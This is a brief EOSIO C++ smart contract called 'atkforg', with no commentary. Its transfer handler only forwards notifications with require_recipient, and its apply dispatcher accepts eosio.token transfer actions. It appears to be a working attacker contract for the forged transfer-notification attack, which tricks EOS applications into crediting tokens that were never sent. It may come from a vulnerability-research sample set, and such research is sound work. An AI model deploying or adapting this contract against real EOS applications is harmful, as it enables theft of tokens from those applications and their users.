#include <eosio/eosio.hpp>
#include <eosio/print.hpp>
#include <eosio/asset.hpp>

using namespace eosio;

class atkforg : public contract {
public:
	using contract::contract;
	[[eosio::action]] void transfer(name from, name to, asset quantity, std::string memo) {
		const char* ffto = memo.c_str();;
		require_recipient(from);
	}
};

extern "C" { 
	void apply(uint64_t receiver, uint64_t code, uint64_t action) {
		if((code == receiver && action != 14829575313431724032)
		|| (code == 6138663591592764928 && action == 14829575313431724032)) { 
			atkforg thiscontract(receiver); 
			switch(action) { 
			case 14829575313431724032: 
				eosio::execute_action(&thiscontract, &atkforg::transfer); 
				break; 
			}
		} 
	} 
}
